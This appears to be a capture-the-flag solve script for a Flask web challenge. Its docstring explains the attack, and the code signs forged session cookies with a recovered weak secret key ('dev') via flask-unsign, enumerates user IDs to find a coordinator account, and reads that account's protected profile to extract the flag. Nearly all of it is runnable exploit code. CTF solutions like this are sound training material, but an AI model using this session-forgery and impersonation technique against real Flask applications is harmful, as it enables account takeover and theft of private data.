#!/usr/bin/env python3
"""
UniDP (WEB, 8th IDP CTF) — Flask session forgery + role-check IDOR.

Chain:
  1. Register a normal student; the Flask session cookie carries
     {"csrf":..., "is_coordinator": false, "uid": N}.
  2. The signing key is weak: SECRET_KEY = 'dev' (recovered offline with
     flask-unsign). So we can mint arbitrary sessions.
  3. Forging is_coordinator:true only reveals the "/coordination" nav link
     (template check). The route itself re-checks the role in the DB *by uid*,
     so we also have to point uid at a real coordinator. Enumerating uid shows
     uid=1 is the coordinator (Profa. Linik Mayara Meireles).
  4. GET /profile as that forged coordinator session → the "Informação
     reservada" field leaks the flag.

Offline except for the HTTP calls; nothing is brute-forced against the flag
submission. Run requests yourself (the box is the event target).

Usage:
  python3 solve.py http://HOST:PORT
Requires: requests, flask-unsign  (pip install requests "flask-unsign[wordlist]")
"""
import sys, re, requests
from flask_unsign import session as fu

SECRET = "dev"            # recovered: flask-unsign --unsign --cookie <cookie>
COORD_UID_RANGE = range(1, 25)

def csrf(html):
    m = re.search(r'name="csrf" value="([^"]+)"', html)
    return m.group(1) if m else None

def main(base):
    base = base.rstrip("/")
    s = requests.Session()

    # 1. register + login a throwaway student (login username == matrícula)
    reg, email, pw = "90318274", "nopseven@test.local", "Senha123x"
    c = csrf(s.get(f"{base}/register").text)
    s.post(f"{base}/register", data={"name": "Nop Seven", "registration": reg,
            "email": email, "course": "Ciência da Computação",
            "password": pw, "csrf": c})
    c = csrf(s.get(f"{base}/").text)
    s.post(f"{base}/", data={"username": reg, "password": pw, "csrf": c})

    sess = fu.loads(s.cookies["session"], legacy=True) if False else None
    # read our own claims straight from the cookie
    claims = fu.decode(s.cookies["session"])
    csrf_tok = claims["csrf"]
    print(f"[*] logged in as uid={claims['uid']} is_coordinator={claims['is_coordinator']}")

    # 2-3. find the coordinator uid: forge is_coordinator:true, probe /coordination
    coord_uid = None
    for uid in COORD_UID_RANGE:
        forged = fu.sign({"csrf": csrf_tok, "is_coordinator": True, "uid": uid}, SECRET)
        r = requests.get(f"{base}/coordination", cookies={"session": forged},
                         allow_redirects=False)
        if r.status_code == 200:
            coord_uid = uid
            print(f"[+] coordinator is uid={uid}")
            break
    if coord_uid is None:
        sys.exit("[-] no coordinator found in range")

    # 4. read the coordinator's profile → flag
    forged = fu.sign({"csrf": csrf_tok, "is_coordinator": True, "uid": coord_uid}, SECRET)
    html = requests.get(f"{base}/profile", cookies={"session": forged}).text
    m = re.search(r"IDP\{[^}]*\}", html)
    print("[+] FLAG:", m.group(0) if m else "not found")

if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000")
